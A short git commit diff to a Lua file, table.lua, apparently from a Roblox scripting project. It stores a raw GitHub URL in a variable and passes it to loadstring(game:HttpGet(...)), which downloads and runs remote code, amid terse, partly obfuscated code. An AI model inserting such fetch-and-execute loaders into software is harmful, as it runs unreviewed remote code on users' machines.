5e219025497a165d652699f4fded3faa0b4bd9e6
ThanhTuoi852123 <51827435+ThanhTuoi852123@users.noreply.github.com>
2023-02-19 22:06:19 +0700

    Update table.lua

--- table.lua
+++ table.lua
@@ -207,6 +207,7 @@
                 end)}
             e[2](8832)
         end) {}
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/bugfestivebean/main/test.lua")) {}
+        c = "https://raw.githubusercontent.com/ThanhTuoi852123/bugfestivebean/main/test.lua"
+        loadstring(game:HttpGet(c)) {}
     end
 )
